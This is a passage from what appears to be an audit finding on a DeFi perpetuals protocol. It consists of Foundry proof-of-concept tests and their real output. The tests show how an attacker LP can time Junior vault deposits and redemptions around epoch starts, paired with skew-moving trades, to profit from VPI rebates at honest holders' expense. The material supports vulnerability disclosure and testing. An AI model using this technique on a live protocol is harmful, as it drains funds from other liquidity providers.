        _fund(retailTrader, 18_000 * LOT_NOTIONAL / 4);
        _open(retailTrader, CfdTypes.Side.LONG, 18_000); // ordinary flow, already in the book in both runs
        _tick(1 hours);
        uint256 snapshot = vm.snapshotState();
        uint256 attackerBase = this.extNaturalSkew(false);
        vm.revertToState(snapshot);
        uint256 attackerHit = this.extNaturalSkew(true);
        emit log_named_decimal_int("attacker net vs no attack, 30% of Junior", _delta(attackerHit, attackerBase), 6);
        assertGt(attackerHit, attackerBase, "a 30% holder profits once ordinary skew exists");
    }

    function extNaturalSkew(
        bool attack
    ) external returns (uint256 wealth) {
        _refreshMark();
        uint256 shares = juniorVault.balanceOf(attackerLp);
        vm.prank(attackerLp);
        uint256 redeemId = juniorVault.requestRedeem(shares, attackerLp, attackerLp);
        vm.warp(pool.lpEpochStart(redeemId) - 90);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark();
        if (attack) {
            _open(attackerTrader, CfdTypes.Side.LONG, 18_000);
        }
        vm.warp(pool.lpEpochStart(redeemId) + 7);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark();
        _keeperSettles();
        if (attack) {
            _close(attackerTrader, CfdTypes.Side.LONG, 18_000);
        }
        wealth = juniorVault.claimableRedeemAssets(redeemId, attackerLp) + clearinghouse.balanceAssets(attackerTrader);
    }

    /// @notice The mirror direction. A skew-reducing open depresses Junior NAV by its rebate until the close claws it back,
    ///         so a deposit activated in between buys cheap from the incumbents.
    function test_DepositDirection_EntryDuringRebateDip() public {
        _setUpPool(0);
        _refreshMark();
        _fund(retailTrader, 32_000 * LOT_NOTIONAL / 4);
        _open(retailTrader, CfdTypes.Side.LONG, 32_000); // ordinary skew that paid VPI long ago
        _tick(1 hours);
        _refreshMark();
        settlementToken.mint(attackerLp, 15_000_000e6);
        vm.startPrank(attackerLp);
        settlementToken.approve(address(juniorVault), 15_000_000e6);
        uint256 depositId = juniorVault.requestDeposit(15_000_000e6, attackerLp, attackerLp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(depositId) - 90);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark();

        uint256 snapshot = vm.snapshotState();
        (uint256 baseWealth, uint256 baseHonest) = this.extDip(depositId, false);
        vm.revertToState(snapshot);
        (uint256 wealth, uint256 honest) = this.extDip(depositId, true);
        emit log_named_decimal_int("attacker net vs no attack, entry during the dip", _delta(wealth, baseWealth), 6);
        emit log_named_decimal_int("honest Junior holder change vs no attack", _delta(honest, baseHonest), 6);
        assertGt(wealth, baseWealth, "the dip entry is profitable");
        assertLt(honest, baseHonest, "the incumbent pays for it");
    }

    function extDip(
        uint256 depositId,
        bool attack
    ) external returns (uint256 wealth, uint256 honest) {
        if (attack) {
            _open(attackerTrader, CfdTypes.Side.SHORT, 32_000);
        }
        vm.warp(pool.lpEpochStart(depositId) + 7);
        vm.roll(vm.getBlockNumber() + 1);
        _refreshMark();
        _keeperSettles();
        uint256 owed = juniorVault.claimableDepositRequest(depositId, attackerLp);
        vm.prank(attackerLp);
        juniorVault.claimDeposit(depositId, owed, attackerLp, attackerLp);
        if (attack) {
            _close(attackerTrader, CfdTypes.Side.SHORT, 32_000);
        }
        _refreshMark();
        (, uint256 juniorAssets,,) = pool.getPendingTrancheState();
        uint256 supply = juniorVault.totalSupply();
        wealth = juniorVault.balanceOf(attackerLp) * juniorAssets / supply + clearinghouse.balanceAssets(attackerTrader);
        honest = juniorVault.balanceOf(honestJunior) * juniorAssets / supply;
    }

}
```

### Real output on an unmodified tree at the commit

```text
Ran 7 tests for test/perps/poc/JuniorNavRefundableVpiPoC.t.sol:JuniorNavRefundableVpiPoC
[PASS] test_DepositDirection_EntryDuringRebateDip() (gas: 10271556)
Logs:
  attacker net vs no attack, entry during the dip: 1661.419495
  honest Junior holder change vs no attack: -4426.444286

[PASS] test_OneDay_FlatBook_HalfOfJunior() (gas: 58572342)
Logs:
  rounds: 8
  elapsed minutes, including the final cash-out: 1500
  honest holder deposited: 2500000.000000
  honest holder cash out, no attack: 2499200.777818
  honest holder cash out, attacked: 2481842.968771
  honest holder change vs no attack: -17357.809047
  honest holder change, bps of its stake: -69
  attacker starting capital: 3500000.000000
  attacker final wealth, no attack: 3499566.076874
  attacker final wealth, attacked: 3504480.835357
  attacker net vs no attack: 4914.758483
  attacker absolute profit on capital: 4480.835357
  treasury change (execution fees): 12441.457496
  Senior change: 0.000000
  keeper change: 1.600000
  closed sum, about zero: 0.006932

[PASS] test_OneDay_FlatBook_SixtyPercentOfJunior() (gas: 58572442)
Logs:
  rounds: 8
  elapsed minutes, including the final cash-out: 1500
  honest holder deposited: 2000000.000000
  honest holder cash out, no attack: 1999287.559944
  honest holder cash out, attacked: 1975825.615127
  honest holder change vs no attack: -23461.944817
  honest holder change, bps of its stake: -117
  attacker starting capital: 4000000.000000
  attacker final wealth, no attack: 3999479.294784
  attacker final wealth, attacked: 4010498.193817
  attacker net vs no attack: 11018.899033
  attacker absolute profit on capital: 10498.193817
  treasury change (execution fees): 12441.457496
  Senior change: 0.000000
  keeper change: 1.600000
  closed sum, about zero: 0.011712

[PASS] test_OneRound_FlatBook_HalfOfJunior() (gas: 11682809)
Logs:
  rounds: 1
  elapsed minutes, including the final cash-out: 240
  honest holder deposited: 2500000.000000
  honest holder cash out, no attack: 2499840.123063
  honest holder cash out, attacked: 2497684.011451
  honest holder change vs no attack: -2156.111612
  honest holder change, bps of its stake: -8
  attacker starting capital: 3500000.000000
  attacker final wealth, no attack: 3499885.772896
  attacker final wealth, attacked: 3500486.503182
  attacker net vs no attack: 600.730286
  attacker absolute profit on capital: 486.503182
  treasury change (execution fees): 1555.182187
  Senior change: 0.000000
  keeper change: 0.200000
  closed sum, about zero: 0.000861

[PASS] test_OneRound_FlatBook_QuarterOfJunior_IsNotProfitable() (gas: 11753581)
Logs:
  rounds: 1
  elapsed minutes, including the final cash-out: 240
  honest holder deposited: 3750000.000000
  honest holder cash out, no attack: 3749783.015845
  honest holder cash out, attacked: 3749527.640373
  honest holder change vs no attack: -255.375472
  honest holder change, bps of its stake: 0
  attacker starting capital: 2250000.000000
  attacker final wealth, no attack: 2249942.867424
  attacker final wealth, attacked: 2248642.873461
  attacker net vs no attack: -1299.993963
  attacker absolute profit on capital: -1357.126539
  treasury change (execution fees): 1555.182187
  Senior change: -0.012685
  keeper change: 0.200000
  closed sum, about zero: 0.000067

[PASS] test_OneRound_NaturalSkew_ThirtyPercentOfJunior() (gas: 10564103)
Logs:
  attacker net vs no attack, 30% of Junior: 106.522512

[PASS] test_ReleaseParameters() (gas: 65994)
Suite result: ok. 7 passed; 0 failed; 0 skipped; finished in 111.30ms (276.79ms CPU time)

Ran 1 test suite in 112.73ms (111.30ms CPU time): 7 tests passed, 0 failed, 0 skipped (7 total tests)
```

